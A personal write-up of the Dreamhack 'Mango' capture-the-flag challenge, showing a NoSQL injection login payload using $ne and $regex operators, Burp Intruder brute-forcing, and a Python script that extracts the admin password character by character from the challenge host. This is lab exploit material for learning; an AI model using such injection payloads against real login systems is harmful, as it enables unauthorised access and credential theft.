---
created: 2026-11-12
tags:
  - note
  - journal
  - cyberStuff
title: Mango - Dreamhack
date: 2026-11-12T11:52:40.966Z
lastmod: 2026-11-16T07:35:43.931Z
---
link: https://dreamhack.io/wargame/challenges/90

by the name of the challenge and the principle suggested to solve this room , we can deduce that we have to perform a NoSql injection:

we know what we can login as guest , with pass guest , which works.\
we can modify the payload to `uid[$ne]=something&upw[$regex]=^D[Hh]\{`\
this basically means that we want all items that does not match uid=something and a upw of length of 32 (we know the password length from the description)\
i used burp for this :![](/images/blog-ul-meu/static/Pasted%20image%2020261112135242.png) and we have admin , this means that our presuption is true\
now we can continue to bruteforce one by one character the upw , which takes kinda much\
![](/images/blog-ul-meu/static/Pasted%20image%2020261112140659.png)\
the next photo series present the workflow , go to intruder , find a new character , add it to the payload and decrement the multiplication factor of `.` , but this will take forever\
![](/images/blog-ul-meu/static/Pasted%20image%2020261112140909.png)\
![](/images/blog-ul-meu/static/Pasted%20image%2020261112140947.png)\
![](/images/blog-ul-meu/static/Pasted%20image%2020261112141017.png)

so we can use this script i found on this writeup:\
https://github.com/jameskaois/ctf-writeups/blob/main/dreamhack/web/level-2/mango/README.md

```python

import requests
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

target_url = "http://host3.dreamhack.games:14712/login?uid[$ne]=guest&upw[$regex]=^D[Hh]\\{"
received_flag_content = ""

for i in range(0, 32):
    for char in charset:
        print(f"Test {received_flag_content}{char}")
        res = requests.get(f"{target_url}{received_flag_content}{char}")

        if "admin" in res.text:
            received_flag_content += char
            print(f"[+] Got {received_flag_content}")
            print()
            break

print(f"Final flag content: {received_flag_content}")
```

and we got the flag\
![](/images/blog-ul-meu/static/Pasted%20image%2020261112143946.png)\
ad DH{} and upload it
